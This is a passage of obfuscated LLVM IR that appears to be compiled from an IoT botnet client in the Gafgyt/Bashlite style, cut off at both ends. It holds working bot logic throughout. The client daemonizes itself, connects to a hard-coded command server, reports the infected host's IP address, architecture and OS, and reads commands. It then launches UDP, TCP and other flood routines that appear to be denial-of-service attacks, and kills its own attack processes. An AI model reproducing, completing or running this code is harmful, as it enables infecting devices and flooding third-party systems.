  %466 = getelementptr inbounds i8*, i8** %465, i64 1
  %467 = load i8*, i8** %466, align 8
  store i8* %467, i8** %24, align 8
  %468 = load i8**, i8*** %4, align 8
  %469 = getelementptr inbounds i8*, i8** %468, i64 2
  %470 = load i8*, i8** %469, align 8
  %471 = call i32 @atoi(i8* %470) #10
  store i32 %471, i32* %25, align 4
  %472 = load i8**, i8*** %4, align 8
  %473 = getelementptr inbounds i8*, i8** %472, i64 3
  %474 = load i8*, i8** %473, align 8
  %475 = call i32 @atoi(i8* %474) #10
  store i32 %475, i32* %26, align 4
  %476 = load i8**, i8*** %4, align 8
  %477 = getelementptr inbounds i8*, i8** %476, i64 4
  %478 = load i8*, i8** %477, align 8
  %479 = call i32 @atoi(i8* %478) #10
  store i32 %479, i32* %27, align 4
  %480 = load i8**, i8*** %4, align 8
  %481 = getelementptr inbounds i8*, i8** %480, i64 5
  %482 = load i8*, i8** %481, align 8
  store i8* %482, i8** %28, align 8
  %483 = load i32, i32* %3, align 4
  %484 = icmp eq i32 %483, 8
  %485 = select i1 %484, i32 963459227, i32 92528939
  store i32 %485, i32* %switchVar
  br label %loopEnd

; <label>:486:                                    ; preds = %loopEntry
  %487 = load i8**, i8*** %4, align 8
  %488 = getelementptr inbounds i8*, i8** %487, i64 7
  %489 = load i8*, i8** %488, align 8
  %490 = call i32 @atoi(i8* %489) #10
  store i32 -1874721586, i32* %switchVar
  store i32 %490, i32* %.reg2mem8
  br label %loopEnd

; <label>:491:                                    ; preds = %loopEntry
  store i32 -1874721586, i32* %switchVar
  store i32 10, i32* %.reg2mem8
  br label %loopEnd

; <label>:492:                                    ; preds = %loopEntry
  %.reload9 = load i32, i32* %.reg2mem8
  store i32 %.reload9, i32* %29, align 4
  %493 = load i32, i32* %3, align 4
  %494 = icmp sgt i32 %493, 6
  %495 = select i1 %494, i32 -1609270076, i32 262158152
  store i32 %495, i32* %switchVar
  br label %loopEnd

; <label>:496:                                    ; preds = %loopEntry
  %497 = load i8**, i8*** %4, align 8
  %498 = getelementptr inbounds i8*, i8** %497, i64 6
  %499 = load i8*, i8** %498, align 8
  %500 = call i32 @atoi(i8* %499) #10
  store i32 -3228387, i32* %switchVar
  store i32 %500, i32* %.reg2mem10
  br label %loopEnd

; <label>:501:                                    ; preds = %loopEntry
  store i32 -3228387, i32* %switchVar
  store i32 0, i32* %.reg2mem10
  br label %loopEnd

; <label>:502:                                    ; preds = %loopEntry
  %.reload11 = load i32, i32* %.reg2mem10
  store i32 %.reload11, i32* %30, align 4
  %503 = load i8*, i8** %24, align 8
  %504 = call i8* @strstr(i8* %503, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i32 0, i32 0)) #10
  %505 = icmp ne i8* %504, null
  %506 = select i1 %505, i32 -707496077, i32 137240174
  store i32 %506, i32* %switchVar
  br label %loopEnd

; <label>:507:                                    ; preds = %loopEntry
  %508 = load i8*, i8** %24, align 8
  %509 = call i8* @strtok(i8* %508, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i32 0, i32 0)) #6
  store i8* %509, i8** %31, align 8
  store i32 -922598759, i32* %switchVar
  br label %loopEnd

; <label>:510:                                    ; preds = %loopEntry
  %511 = load i8*, i8** %31, align 8
  %512 = icmp ne i8* %511, null
  %513 = select i1 %512, i32 -97878586, i32 1734745441
  store i32 %513, i32* %switchVar
  br label %loopEnd

; <label>:514:                                    ; preds = %loopEntry
  %515 = call i32 @listFork()
  %516 = icmp ne i32 %515, 0
  %517 = select i1 %516, i32 -811268387, i32 1678581135
  store i32 %517, i32* %switchVar
  br label %loopEnd

; <label>:518:                                    ; preds = %loopEntry
  %519 = load i8*, i8** %24, align 8
  %520 = load i32, i32* %25, align 4
  %521 = load i32, i32* %26, align 4
  call void @astd(i8* %519, i32 %520, i32 %521)
  %522 = load i8*, i8** %24, align 8
  %523 = load i32, i32* %25, align 4
  %524 = load i32, i32* %26, align 4
  %525 = load i32, i32* %27, align 4
  %526 = load i32, i32* %30, align 4
  %527 = load i32, i32* %29, align 4
  call void @audp(i8* %522, i32 %523, i32 %524, i32 %525, i32 %526, i32 %527)
  %528 = load i8*, i8** %24, align 8
  %529 = load i32, i32* %25, align 4
  %530 = load i32, i32* %26, align 4
  %531 = load i32, i32* %27, align 4
  %532 = load i8*, i8** %28, align 8
  %533 = load i32, i32* %30, align 4
  %534 = load i32, i32* %29, align 4
  call void @atcp(i8* %528, i32 %529, i32 %530, i32 %531, i8* %532, i32 %533, i32 %534)
  %535 = load i32, i32* @mainCommSock, align 4
  %536 = call i32 @close(i32 %535)
  call void @_exit(i32 0) #11
  unreachable

; <label>:537:                                    ; preds = %loopEntry
  %538 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i32 0, i32 0)) #6
  store i8* %538, i8** %31, align 8
  store i32 -922598759, i32* %switchVar
  br label %loopEnd

; <label>:539:                                    ; preds = %loopEntry
  store i32 1094237297, i32* %switchVar
  br label %loopEnd

; <label>:540:                                    ; preds = %loopEntry
  %541 = call i32 @listFork()
  %542 = icmp ne i32 %541, 0
  %543 = select i1 %542, i32 1808280335, i32 1707562557
  store i32 %543, i32* %switchVar
  br label %loopEnd

; <label>:544:                                    ; preds = %loopEntry
  store i32 1513159941, i32* %switchVar
  br label %loopEnd

; <label>:545:                                    ; preds = %loopEntry
  %546 = load i8*, i8** %24, align 8
  %547 = load i32, i32* %25, align 4
  %548 = load i32, i32* %26, align 4
  call void @astd(i8* %546, i32 %547, i32 %548)
  %549 = load i8*, i8** %24, align 8
  %550 = load i32, i32* %25, align 4
  %551 = load i32, i32* %26, align 4
  %552 = load i32, i32* %27, align 4
  %553 = load i32, i32* %30, align 4
  %554 = load i32, i32* %29, align 4
  call void @audp(i8* %549, i32 %550, i32 %551, i32 %552, i32 %553, i32 %554)
  %555 = load i8*, i8** %24, align 8
  %556 = load i32, i32* %25, align 4
  %557 = load i32, i32* %26, align 4
  %558 = load i32, i32* %27, align 4
  %559 = load i8*, i8** %28, align 8
  %560 = load i32, i32* %30, align 4
  %561 = load i32, i32* %29, align 4
  call void @atcp(i8* %555, i32 %556, i32 %557, i32 %558, i8* %559, i32 %560, i32 %561)
  %562 = load i32, i32* @mainCommSock, align 4
  %563 = call i32 @close(i32 %562)
  call void @_exit(i32 0) #11
  unreachable

; <label>:564:                                    ; preds = %loopEntry
  store i32 -1807059122, i32* %switchVar
  br label %loopEnd

; <label>:565:                                    ; preds = %loopEntry
  %566 = load i8**, i8*** %4, align 8
  %567 = getelementptr inbounds i8*, i8** %566, i64 0
  %568 = load i8*, i8** %567, align 8
  %569 = call i32 @strcmp(i8* %568, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.36, i32 0, i32 0)) #10
  %570 = icmp ne i32 %569, 0
  %571 = select i1 %570, i32 -1593870825, i32 1958698110
  store i32 %571, i32* %switchVar
  br label %loopEnd

; <label>:572:                                    ; preds = %loopEntry
  %573 = load i32, i32* %3, align 4
  %574 = icmp slt i32 %573, 4
  %575 = select i1 %574, i32 -471076984, i32 -1286793859
  store i32 %575, i32* %switchVar
  br label %loopEnd

; <label>:576:                                    ; preds = %loopEntry
  %577 = load i8**, i8*** %4, align 8
  %578 = getelementptr inbounds i8*, i8** %577, i64 2
  %579 = load i8*, i8** %578, align 8
  %580 = call i32 @atoi(i8* %579) #10
  %581 = icmp slt i32 %580, 1
  %582 = select i1 %581, i32 -471076984, i32 960102171
  store i32 %582, i32* %switchVar
  br label %loopEnd

; <label>:583:                                    ; preds = %loopEntry
  %584 = load i8**, i8*** %4, align 8
  %585 = getelementptr inbounds i8*, i8** %584, i64 3
  %586 = load i8*, i8** %585, align 8
  %587 = call i32 @atoi(i8* %586) #10
  %588 = icmp slt i32 %587, 1
  %589 = select i1 %588, i32 -471076984, i32 -1104226737
  store i32 %589, i32* %switchVar
  br label %loopEnd

; <label>:590:                                    ; preds = %loopEntry
  store i32 1513159941, i32* %switchVar
  br label %loopEnd

; <label>:591:                                    ; preds = %loopEntry
  %592 = load i8**, i8*** %4, align 8
  %593 = getelementptr inbounds i8*, i8** %592, i64 1
  %594 = load i8*, i8** %593, align 8
  store i8* %594, i8** %32, align 8
  %595 = load i8**, i8*** %4, align 8
  %596 = getelementptr inbounds i8*, i8** %595, i64 2
  %597 = load i8*, i8** %596, align 8
  %598 = call i32 @atoi(i8* %597) #10
  store i32 %598, i32* %33, align 4
  %599 = load i8**, i8*** %4, align 8
  %600 = getelementptr inbounds i8*, i8** %599, i64 3
  %601 = load i8*, i8** %600, align 8
  %602 = call i32 @atoi(i8* %601) #10
  store i32 %602, i32* %34, align 4
  %603 = load i8*, i8** %32, align 8
  %604 = call i8* @strstr(i8* %603, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i32 0, i32 0)) #10
  %605 = icmp ne i8* %604, null
  %606 = select i1 %605, i32 697328305, i32 -462343200
  store i32 %606, i32* %switchVar
  br label %loopEnd

; <label>:607:                                    ; preds = %loopEntry
  %608 = load i8*, i8** %32, align 8
  %609 = call i8* @strtok(i8* %608, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i32 0, i32 0)) #6
  store i8* %609, i8** %35, align 8
  store i32 -398523161, i32* %switchVar
  br label %loopEnd

; <label>:610:                                    ; preds = %loopEntry
  %611 = load i8*, i8** %35, align 8
  %612 = icmp ne i8* %611, null
  %613 = select i1 %612, i32 -2014985924, i32 285870041
  store i32 %613, i32* %switchVar
  br label %loopEnd

; <label>:614:                                    ; preds = %loopEntry
  %615 = call i32 @listFork()
  %616 = icmp ne i32 %615, 0
  %617 = select i1 %616, i32 299415090, i32 1204511530
  store i32 %617, i32* %switchVar
  br label %loopEnd

; <label>:618:                                    ; preds = %loopEntry
  %619 = load i8*, i8** %35, align 8
  %620 = load i32, i32* %33, align 4
  %621 = load i32, i32* %34, align 4
  call void @acnc(i8* %619, i32 %620, i32 %621)
  %622 = load i32, i32* @mainCommSock, align 4
  %623 = call i32 @close(i32 %622)
  call void @_exit(i32 0) #11
  unreachable

; <label>:624:                                    ; preds = %loopEntry
  %625 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i32 0, i32 0)) #6
  store i8* %625, i8** %35, align 8
  store i32 -398523161, i32* %switchVar
  br label %loopEnd

; <label>:626:                                    ; preds = %loopEntry
  store i32 -472017700, i32* %switchVar
  br label %loopEnd

; <label>:627:                                    ; preds = %loopEntry
  %628 = call i32 @listFork()
  %629 = icmp ne i32 %628, 0
  %630 = select i1 %629, i32 -201755919, i32 -2147243508
  store i32 %630, i32* %switchVar
  br label %loopEnd

; <label>:631:                                    ; preds = %loopEntry
  store i32 1513159941, i32* %switchVar
  br label %loopEnd

; <label>:632:                                    ; preds = %loopEntry
  %633 = load i8*, i8** %32, align 8
  %634 = load i32, i32* %33, align 4
  %635 = load i32, i32* %34, align 4
  call void @acnc(i8* %633, i32 %634, i32 %635)
  call void @_exit(i32 0) #11
  unreachable

; <label>:636:                                    ; preds = %loopEntry
  store i32 -1593870825, i32* %switchVar
  br label %loopEnd

; <label>:637:                                    ; preds = %loopEntry
  %638 = load i8**, i8*** %4, align 8
  %639 = getelementptr inbounds i8*, i8** %638, i64 0
  %640 = load i8*, i8** %639, align 8
  %641 = call i32 @strcmp(i8* %640, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.37, i32 0, i32 0)) #10
  %642 = icmp ne i32 %641, 0
  %643 = select i1 %642, i32 1513159941, i32 -304824127
  store i32 %643, i32* %switchVar
  br label %loopEnd

; <label>:644:                                    ; preds = %loopEntry
  store i32 0, i32* %36, align 4
  store i64 0, i64* %37, align 8
  store i32 -1301716570, i32* %switchVar
  br label %loopEnd

; <label>:645:                                    ; preds = %loopEntry
  %646 = load i64, i64* %37, align 8
  %647 = load i64, i64* @numpids, align 8
  %648 = icmp ult i64 %646, %647
  %649 = select i1 %648, i32 -37015241, i32 -505190147
  store i32 %649, i32* %switchVar
  br label %loopEnd

; <label>:650:                                    ; preds = %loopEntry
  %651 = load i32*, i32** @pids, align 8
  %652 = load i64, i64* %37, align 8
  %653 = getelementptr inbounds i32, i32* %651, i64 %652
  %654 = load i32, i32* %653, align 4
  %655 = icmp ne i32 %654, 0
  %656 = select i1 %655, i32 1780488461, i32 1844696734
  store i32 %656, i32* %switchVar
  br label %loopEnd

; <label>:657:                                    ; preds = %loopEntry
  %658 = load i32*, i32** @pids, align 8
  %659 = load i64, i64* %37, align 8
  %660 = getelementptr inbounds i32, i32* %658, i64 %659
  %661 = load i32, i32* %660, align 4
  %662 = call i32 @getpid() #6
  %663 = icmp ne i32 %661, %662
  %664 = select i1 %663, i32 17763173, i32 1844696734
  store i32 %664, i32* %switchVar
  br label %loopEnd

; <label>:665:                                    ; preds = %loopEntry
  %666 = load i32*, i32** @pids, align 8
  %667 = load i64, i64* %37, align 8
  %668 = getelementptr inbounds i32, i32* %666, i64 %667
  %669 = load i32, i32* %668, align 4
  %670 = call i32 @kill(i32 %669, i32 9) #6
  %671 = load i32, i32* %36, align 4
  %672 = add nsw i32 %671, 1
  store i32 %672, i32* %36, align 4
  store i32 1844696734, i32* %switchVar
  br label %loopEnd

; <label>:673:                                    ; preds = %loopEntry
  store i32 130788617, i32* %switchVar
  br label %loopEnd

; <label>:674:                                    ; preds = %loopEntry
  %675 = load i64, i64* %37, align 8
  %676 = add i64 %675, 1
  store i64 %676, i64* %37, align 8
  store i32 -1301716570, i32* %switchVar
  br label %loopEnd

; <label>:677:                                    ; preds = %loopEntry
  %678 = load i32, i32* %36, align 4
  %679 = icmp sgt i32 %678, 0
  %680 = select i1 %679, i32 -1514283348, i32 -267127399
  store i32 %680, i32* %switchVar
  br label %loopEnd

; <label>:681:                                    ; preds = %loopEntry
  store i32 1318146161, i32* %switchVar
  br label %loopEnd

; <label>:682:                                    ; preds = %loopEntry
  store i32 1318146161, i32* %switchVar
  br label %loopEnd

; <label>:683:                                    ; preds = %loopEntry
  store i32 1513159941, i32* %switchVar
  br label %loopEnd

; <label>:684:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %683, %682, %681, %677, %674, %673, %665, %657, %650, %645, %644, %637, %636, %631, %627, %626, %624, %614, %610, %607, %591, %590, %583, %576, %572, %565, %564, %544, %540, %539, %537, %514, %510, %507, %502, %501, %496, %492, %491, %486, %464, %463, %456, %452, %445, %441, %434, %427, %420, %413, %409, %402, %401, %377, %373, %372, %370, %356, %352, %349, %344, %343, %338, %334, %333, %328, %306, %305, %298, %294, %287, %283, %276, %269, %262, %255, %251, %244, %243, %238, %234, %233, %231, %223, %219, %216, %200, %199, %192, %185, %181, %174, %173, %163, %159, %158, %156, %143, %139, %136, %131, %130, %125, %102, %101, %94, %90, %83, %76, %69, %62, %55, %48, %44, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind readonly
declare i32 @atoi(i8*) #5

; Function Attrs: nounwind
declare i32 @getpid() #3

; Function Attrs: nounwind
declare i32 @kill(i32, i32) #3

; Function Attrs: noinline nounwind uwtable
define i32 @initConnection() #0 {
  %.reg2mem = alloca i32
  %1 = alloca i32, align 4
  %2 = alloca [512 x i8], align 16
  %3 = alloca i32, align 4
  %4 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %4, i8 0, i64 512, i32 16, i1 false)
  %5 = load i32, i32* @mainCommSock, align 4
  store i32 %5, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 388937486, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 388937486, label %first
    i32 -1439015732, label %8
    i32 759057921, label %11
    i32 -2116426893, label %17
    i32 -401470852, label %18
    i32 -1488577461, label %21
    i32 1788410904, label %32
    i32 -1793904732, label %39
    i32 1311034937, label %47
    i32 -274677017, label %48
    i32 -26918798, label %49
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %6 = icmp ne i32 %.reload, 0
  %7 = select i1 %6, i32 -1439015732, i32 759057921
  store i32 %7, i32* %switchVar
  br label %loopEnd

; <label>:8:                                      ; preds = %loopEntry
  %9 = load i32, i32* @mainCommSock, align 4
  %10 = call i32 @close(i32 %9)
  store i32 0, i32* @mainCommSock, align 4
  store i32 759057921, i32* %switchVar
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  %12 = load i32, i32* @currentServer, align 4
  %13 = add nsw i32 %12, 1
  %14 = sext i32 %13 to i64
  %15 = icmp eq i64 %14, 1
  %16 = select i1 %15, i32 -2116426893, i32 -401470852
  store i32 %16, i32* %switchVar
  br label %loopEnd

; <label>:17:                                     ; preds = %loopEntry
  store i32 0, i32* @currentServer, align 4
  store i32 -1488577461, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load i32, i32* @currentServer, align 4
  %20 = add nsw i32 %19, 1
  store i32 %20, i32* @currentServer, align 4
  store i32 -1488577461, i32* %switchVar
  br label %loopEnd

; <label>:21:                                     ; preds = %loopEntry
  %22 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %23 = load i32, i32* @currentServer, align 4
  %24 = sext i32 %23 to i64
  %25 = getelementptr inbounds [1 x i8*], [1 x i8*]* @commServer, i64 0, i64 %24
  %26 = load i8*, i8** %25, align 8
  %27 = call i8* @strcpy(i8* %22, i8* %26) #6
  store i32 6982, i32* %3, align 4
  %28 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %29 = call i8* @strchr(i8* %28, i32 58) #10
  %30 = icmp ne i8* %29, null
  %31 = select i1 %30, i32 1788410904, i32 -1793904732
  store i32 %31, i32* %switchVar
  br label %loopEnd

; <label>:32:                                     ; preds = %loopEntry
  %33 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %34 = call i8* @strchr(i8* %33, i32 58) #10
  %35 = getelementptr inbounds i8, i8* %34, i64 1
  %36 = call i32 @atoi(i8* %35) #10
  store i32 %36, i32* %3, align 4
  %37 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %38 = call i8* @strchr(i8* %37, i32 58) #10
  store i8 0, i8* %38, align 1
  store i32 -1793904732, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %40 = call i32 @socket(i32 2, i32 1, i32 0) #6
  store i32 %40, i32* @mainCommSock, align 4
  %41 = load i32, i32* @mainCommSock, align 4
  %42 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %43 = load i32, i32* %3, align 4
  %44 = call i32 @connectTimeout(i32 %41, i8* %42, i32 %43, i32 30)
  %45 = icmp ne i32 %44, 0
  %46 = select i1 %45, i32 -274677017, i32 1311034937
  store i32 %46, i32* %switchVar
  br label %loopEnd

; <label>:47:                                     ; preds = %loopEntry
  store i32 1, i32* %1, align 4
  store i32 -26918798, i32* %switchVar
  br label %loopEnd

; <label>:48:                                     ; preds = %loopEntry
  store i32 0, i32* %1, align 4
  store i32 -26918798, i32* %switchVar
  br label %loopEnd

; <label>:49:                                     ; preds = %loopEntry
  %50 = load i32, i32* %1, align 4
  ret i32 %50

loopEnd:                                          ; preds = %48, %47, %39, %32, %21, %18, %17, %11, %8, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind readonly
declare i8* @strchr(i8*, i32) #5

; Function Attrs: noinline nounwind uwtable
define i32 @main(i32, i8**) #0 {
  %.reg2mem = alloca i32
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca [4096 x i8], align 16
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i8*, align 8
  %15 = alloca i8*, align 8
  %16 = alloca i8*, align 8
  %17 = alloca i8*, align 8
  %18 = alloca [10 x i8*], align 16
  %19 = alloca i32, align 4
  %20 = alloca i8*, align 8
  %21 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %22 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %23 = call i32 @getpid() #6
  %24 = xor i32 %22, %23
  call void @srand(i32 %24) #6
  %25 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %26 = call i32 @getpid() #6
  %27 = xor i32 %25, %26
  call void @init_rand(i32 %27)
  %28 = call i32 @getOurIP()
  %29 = call i32 @fork() #6
  store i32 %29, i32* %.reg2mem
  %.reload2 = load volatile i32, i32* %.reg2mem
  store i32 %.reload2, i32* %6, align 4
  %switchVar = alloca i32
  store i32 1957170497, i32* %switchVar
  %.reg2mem3 = alloca i1
  %.reg2mem5 = alloca i1
  %.reg2mem7 = alloca i1
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1957170497, label %first
    i32 -208573612, label %32
    i32 -354210914, label %35
    i32 209166928, label %39
    i32 -743391194, label %43
    i32 -400661489, label %44
    i32 -1115899551, label %48
    i32 186213540, label %49
    i32 -419277554, label %50
    i32 -209501688, label %51
    i32 -697008275, label %52
    i32 -499745216, label %53
    i32 1887752781, label %54
    i32 683646627, label %58
    i32 -1820739442, label %62
    i32 1654418068, label %64
    i32 261951118, label %73
    i32 1939813681, label %79
    i32 -1633186401, label %80
    i32 -1790657714, label %86
    i32 918711492, label %95
    i32 -1984725187, label %98
    i32 -2097827758, label %104
    i32 985782790, label %115
    i32 1240095240, label %118
    i32 1626680864, label %131
    i32 -795518664, label %137
    i32 -1666344349, label %147
    i32 -2087724597, label %150
    i32 1777431464, label %154
    i32 949297668, label %155
    i32 1094292258, label %158
    i32 42624496, label %169
    i32 524998191, label %172
    i32 1464624232, label %178
    i32 1890479882, label %183
    i32 555252539, label %185
    i32 224484600, label %188
    i32 -1163807158, label %194
    i32 -2107718436, label %195
    i32 372228825, label %204
    i32 2052958594, label %214
    i32 -1112463283, label %223
    i32 -1678923192, label %225
    i32 -837117466, label %231
    i32 1898462848, label %233
    i32 -154521033, label %239
    i32 132855777, label %244
    i32 1250631248, label %246
    i32 -1793440143, label %249
    i32 1177813619, label %254
    i32 291420546, label %259
    i32 -784857210, label %268
    i32 56003313, label %273
    i32 162800866, label %277
    i32 790373396, label %283
    i32 -365077620, label %306
    i32 1787459755, label %308
    i32 -1055605131, label %314
    i32 506602157, label %315
    i32 1964168835, label %320
    i32 1561512177, label %325
    i32 210506497, label %328
    i32 1108682695, label %329
    i32 -20386168, label %330
    i32 -488216576, label %331
    i32 843761340, label %332
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %30 = icmp ne i32 %.reload, 0
  %31 = select i1 %30, i32 -208573612, i32 -354210914
  store i32 %31, i32* %switchVar
  br label %loopEnd

; <label>:32:                                     ; preds = %loopEntry
  %33 = load i32, i32* %6, align 4
  %34 = call i32 @waitpid(i32 %33, i32* %8, i32 0)
  call void @exit(i32 0) #12
  unreachable

; <label>:35:                                     ; preds = %loopEntry
  %36 = load i32, i32* %6, align 4
  %37 = icmp ne i32 %36, 0
  %38 = select i1 %37, i32 -697008275, i32 209166928
  store i32 %38, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %40 = call i32 @fork() #6
  store i32 %40, i32* %7, align 4
  %41 = icmp ne i32 %40, 0
  %42 = select i1 %41, i32 -743391194, i32 -400661489
  store i32 %42, i32* %switchVar
  br label %loopEnd

; <label>:43:                                     ; preds = %loopEntry
  call void @exit(i32 0) #12
  unreachable

; <label>:44:                                     ; preds = %loopEntry
  %45 = load i32, i32* %7, align 4
  %46 = icmp ne i32 %45, 0
  %47 = select i1 %46, i32 186213540, i32 -1115899551
  store i32 %47, i32* %switchVar
  br label %loopEnd

; <label>:48:                                     ; preds = %loopEntry
  store i32 -419277554, i32* %switchVar
  br label %loopEnd

; <label>:49:                                     ; preds = %loopEntry
  store i32 -419277554, i32* %switchVar
  br label %loopEnd

; <label>:50:                                     ; preds = %loopEntry
  store i32 -209501688, i32* %switchVar
  br label %loopEnd

; <label>:51:                                     ; preds = %loopEntry
  store i32 -499745216, i32* %switchVar
  br label %loopEnd

; <label>:52:                                     ; preds = %loopEntry
  store i32 -499745216, i32* %switchVar
  br label %loopEnd

; <label>:53:                                     ; preds = %loopEntry
  store i32 1887752781, i32* %switchVar
  br label %loopEnd

; <label>:54:                                     ; preds = %loopEntry
  %55 = call i32 @setsid() #6
  %56 = call i32 @chdir(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.38, i32 0, i32 0)) #6
  %57 = call void (i32)* @signal(i32 13, void (i32)* inttoptr (i64 1 to void (i32)*)) #6
  store i32 683646627, i32* %switchVar
  br label %loopEnd

; <label>:58:                                     ; preds = %loopEntry
  %59 = call i32 @initConnection()
  %60 = icmp ne i32 %59, 0
  %61 = select i1 %60, i32 -1820739442, i32 1654418068
  store i32 %61, i32* %switchVar
  br label %loopEnd

; <label>:62:                                     ; preds = %loopEntry
  %63 = call i32 @sleep(i32 5)
  store i32 683646627, i32* %switchVar
  br label %loopEnd

; <label>:64:                                     ; preds = %loopEntry
  %65 = load i32, i32* @mainCommSock, align 4
  %66 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %67 = call i8* @inet_ntoa(i32 %66) #6
  %68 = call i8* @getPortz()
  %69 = call i8* @getBuildz()
  %70 = call i8* @getArch()
  %71 = call i8* @getOS()
  %72 = call i32 (i32, i8*, ...) @sockprintf(i32 %65, i8* getelementptr inbounds ([46 x i8], [46 x i8]* @.str.39, i32 0, i32 0), i8* %67, i8* %68, i8* %69, i8* %70, i8* %71)
  store i32 0, i32* %10, align 4
  store i32 0, i32* %11, align 4
  store i32 261951118, i32* %switchVar
  br label %loopEnd

; <label>:73:                                     ; preds = %loopEntry
  %74 = load i32, i32* @mainCommSock, align 4
  %75 = getelementptr inbounds [4096 x i8], [4096 x i8]* %9, i32 0, i32 0
  %76 = call i32 @recvLine(i32 %74, i8* %75, i32 4096)
  store i32 %76, i32* %10, align 4
  %77 = icmp ne i32 %76, -1
  %78 = select i1 %77, i32 1939813681, i32 -488216576
  store i32 %78, i32* %switchVar
  br label %loopEnd

; <label>:79:                                     ; preds = %loopEntry
  store i32 0, i32* %11, align 4
  store i32 -1633186401, i32* %switchVar
  br label %loopEnd

; <label>:80:                                     ; preds = %loopEntry
  %81 = load i32, i32* %11, align 4
  %82 = sext i32 %81 to i64
  %83 = load i64, i64* @numpids, align 8
  %84 = icmp ult i64 %82, %83
  %85 = select i1 %84, i32 -1790657714, i32 1094292258
  store i32 %85, i32* %switchVar
  br label %loopEnd

; <label>:86:                                     ; preds = %loopEntry
  %87 = load i32*, i32** @pids, align 8
  %88 = load i32, i32* %11, align 4
  %89 = sext i32 %88 to i64
  %90 = getelementptr inbounds i32, i32* %87, i64 %89
  %91 = load i32, i32* %90, align 4
  %92 = call i32 @waitpid(i32 %91, i32* null, i32 1)
  %93 = icmp sgt i32 %92, 0
  %94 = select i1 %93, i32 918711492, i32 1777431464
  store i32 %94, i32* %switchVar
  br label %loopEnd

; <label>:95:                                     ; preds = %loopEntry
  %96 = load i32, i32* %11, align 4
  %97 = add nsw i32 %96, 1
  store i32 %97, i32* %13, align 4
  store i32 -1984725187, i32* %switchVar
  br label %loopEnd

; <label>:98:                                     ; preds = %loopEntry
  %99 = load i32, i32* %13, align 4
  %100 = zext i32 %99 to i64
  %101 = load i64, i64* @numpids, align 8
  %102 = icmp ult i64 %100, %101
  %103 = select i1 %102, i32 -2097827758, i32 1240095240
  store i32 %103, i32* %switchVar
  br label %loopEnd

; <label>:104:                                    ; preds = %loopEntry
  %105 = load i32*, i32** @pids, align 8
  %106 = load i32, i32* %13, align 4
  %107 = zext i32 %106 to i64
  %108 = getelementptr inbounds i32, i32* %105, i64 %107
  %109 = load i32, i32* %108, align 4
  %110 = load i32*, i32** @pids, align 8
  %111 = load i32, i32* %13, align 4
  %112 = sub i32 %111, 1
  %113 = zext i32 %112 to i64
  %114 = getelementptr inbounds i32, i32* %110, i64 %113
  store i32 %109, i32* %114, align 4
  store i32 985782790, i32* %switchVar
  br label %loopEnd

; <label>:115:                                    ; preds = %loopEntry
  %116 = load i32, i32* %13, align 4
  %117 = add i32 %116, 1
  store i32 %117, i32* %13, align 4
  store i32 -1984725187, i32* %switchVar
  br label %loopEnd

; <label>:118:                                    ; preds = %loopEntry
  %119 = load i32*, i32** @pids, align 8
  %120 = load i32, i32* %13, align 4
  %121 = sub i32 %120, 1
  %122 = zext i32 %121 to i64
  %123 = getelementptr inbounds i32, i32* %119, i64 %122
  store i32 0, i32* %123, align 4
  %124 = load i64, i64* @numpids, align 8
  %125 = add i64 %124, -1
  store i64 %125, i64* @numpids, align 8
  %126 = load i64, i64* @numpids, align 8
  %127 = add i64 %126, 1
  %128 = mul i64 %127, 4
  %129 = call noalias i8* @malloc(i64 %128) #6
  %130 = bitcast i8* %129 to i32*
  store i32* %130, i32** %12, align 8
  store i32 0, i32* %13, align 4
  store i32 1626680864, i32* %switchVar
  br label %loopEnd

; <label>:131:                                    ; preds = %loopEntry
